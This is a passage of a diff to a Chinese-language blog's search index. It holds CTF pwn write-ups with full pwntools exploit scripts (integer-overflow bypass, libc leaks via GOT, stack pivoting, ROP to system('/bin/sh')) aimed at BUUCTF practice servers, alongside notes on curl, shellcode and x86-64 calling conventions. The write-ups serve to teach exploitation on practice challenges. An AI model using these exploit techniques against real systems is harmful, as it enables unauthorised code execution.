class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload2+=p64(mov_rdxr13_call)+p64(execve)</span><br><span class="line">payload2+=p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>2.找到s在栈上的位置</p>
-<p>算出ebp-0x38是参数s在栈上的位置</p>
-<p>3.布置栈上的值</p>
-<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27757</span>)</span><br><span class="line"></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>cat flag</p>
-<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
+<p>cat flag!</p>
+<p><img src="/img/image-20210628181623724.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -537,6 +550,20 @@
       </tags>
   </entry>
   <entry>
+    <title>CURL</title>
+    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
+
+<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jarvisoj_level3_x64</title>
     <url>/2021/07/11/level3-x64/</url>
     <content><![CDATA[<h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>检查保护机制，64位，开NX</p>
@@ -569,106 +596,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CURL</title>
-    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
-
-<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>blog诞生日2021.6.17</title>
-    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
-]]></content>
-      <categories>
-        <category>日常闲话</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn2_sctf_2016</title>
-    <url>/2021/07/06/pwn2-sctf-2016/</url>
-    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
-<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
-<p>尝试运行了一下</p>
-<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
-<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
-<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
-<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
-<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
-<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
-<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
-<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
-<p><img src="/img/image-20210627163859886.png" alt="image-20210627163859886"></p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
-<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
-<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
-<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>泄露libc</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>
-
-<p>算出system和’/bin/sh’的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>覆盖返回地址，夺权</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>picoctf_2018_rop</title>
-    <url>/2021/07/17/picoctf-2018-rop/</url>
-    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
-<p>IDA打开</p>
-<p>main函数，里面发现vuln函数</p>
-<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
-<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
-<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
-<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
-<p>win_function1函数</p>
-<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
-<p>win_function2函数</p>
-<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>
-
-<p>先对win1赋值，使win1=1</p>
-<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pwn1</title>
     <url>/2021/07/15/pwn1/</url>
     <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
@@ -687,51 +614,6 @@
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27426</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;spwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_s = <span class="number">0x0804A300</span>				<span class="comment">#将fake栈迁移到bss中</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span>			<span class="comment">#栈迁移所需要的的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]	<span class="comment">#plt表可以调用write函数</span></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]	<span class="comment">#got表里有write函数的真实地址</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]	<span class="comment">#控制函数执行流需要再次回到主函数</span></span><br><span class="line"><span class="comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"><span class="comment"># 上面将一些执行流程写入了bss段</span></span><br><span class="line"><span class="comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> <span class="comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span></span><br><span class="line">payload += p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>)) <span class="comment">#接收泄露的地址</span></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&quot;write&quot;, write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]<span class="comment">#获取libc的基地址</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]<span class="comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))<span class="comment">#通过获取到的libc的基地址和&quot;/bin/sh&quot;在libc中的地址可以得到&quot;/bin/sh&quot;在程序中的真实地址</span></span><br><span class="line"><span class="comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span></span><br><span class="line"><span class="comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">b&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p32(bss_s) + p32(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;say?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode</title>
-    <url>/2021/11/22/shellcode/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
-<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcod</span></span><br></pre></td></tr></table></figure>
-
-<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable_simple_login</title>
-    <url>/2022/01/21/pwnable_simple_login/</url>
-    <content><![CDATA[<span id="more"></span>
-<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
-<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
-<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
-<p>继续看IDA，main函数</p>
-<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
-<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
-<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
-<p>于是继续找，找到auth函数里有了一个漏洞点</p>
-<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
-<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
-<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
-<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Authenticate : &quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(<span class="number">0x0804927F</span>)+p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload=payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>最后</p>
-<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -771,53 +653,6 @@
       </tags>
   </entry>
   <entry>
-    <title>一些危险函数和64位寄存器与32位不同之处</title>
-    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>列举一下常见的危险函数：</p>
-<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
-    scanf
-    vscanf
-</code></pre>
-<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
-</code></pre>
-<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
-    strcat，字符串拼接，遇到&#39;\x00&#39;停止
-    copy
-</code></pre>
-<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
-<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
-<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
-<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
-<p><img src="/img/64.png"></p>
-<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
-callq 在栈里存放一个8位的返回地址
-许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
-函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
-不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
-
-一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
-</code></pre>
-<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
-剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
-调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
-</code></pre>
-<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
-<pre><code>本地变量太多，寄存器不够
-一些本地变量是数组或结构体
-函数使用了取地址操作符来计算一个本地变量的地址
-函数必须用栈传送一些参数给另外一个函数
-函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
-</code></pre>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ret2text</title>
     <url>/2021/06/20/ret2text/</url>
     <content><![CDATA[<span id="more"></span>
@@ -839,6 +674,55 @@ callq 在栈里存放一个8位的返回地址
 <p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
 <p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
 <p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>picoctf_2018_rop</title>
+    <url>/2021/07/17/picoctf-2018-rop/</url>
+    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
+<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
+<p>IDA打开</p>
+<p>main函数，里面发现vuln函数</p>
+<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
+<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
